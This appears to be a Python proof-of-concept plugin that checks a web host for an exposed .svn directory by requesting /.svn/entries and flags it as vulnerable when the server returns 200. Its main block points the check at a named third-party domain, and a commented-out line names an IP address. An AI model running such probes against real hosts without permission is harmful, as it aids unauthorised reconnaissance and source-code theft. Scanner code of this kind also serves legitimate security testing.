# coding:utf-8
import requests
requests.packages.urllib3.disable_warnings()


      
class c2Class(object):
    def __init__(self):
        self.vulname = 'SVN Leak'
        self.vulsystem= 'svn'
        self.vulsystemintro = 'SVN 是一个开源的集中式版本控制系统'
        self.vuldesc='SVN会在代码目录下生成.svn文件夹，其中会包含代码的备份，如果未限制对.SVN目录的访问，则攻击者可以读取该目录，下载代码备份。'
        self.vulversion = ''
        self.fofa=''
        self.findtime=''
        self.refer= ''
        self.pyv=2
        self.testisok=True

        self.vulpath='/.svn/entries'
        self.flag=200

    def c2Func(self,target):
        status=0
        returnData=''

        flag=0
        try:
            if target.startswith(('http://','https://')):
                # 这是为了拿到 <http://主机名>这样格式的数据
                target=target+'/'
                target=target[:target.find('/',8)] # 在https://、http://的协议开头之后寻找/
            else:
                target='http://'+target

            url=target+self.vulpath
            resp=requests.get(url=url,verify=False,timeout=5)
            # print(resp.status_code)
            if self.flag == resp.status_code:
                returnData='%s is vlun(%s), vulpath: %s .u can attack by svnExploit'\
                ''%(target,self.vulname,url)
        except Exception as e:
            # print(e)
            returnData=str(e)
        return status,returnData

if __name__ == '__main__':
    target='http://trafficbonus.com/.svn/entries'
    # target='http://101.226.168.75:8888'
    pocObj=c2Class()
    print(pocObj.c2Func(target))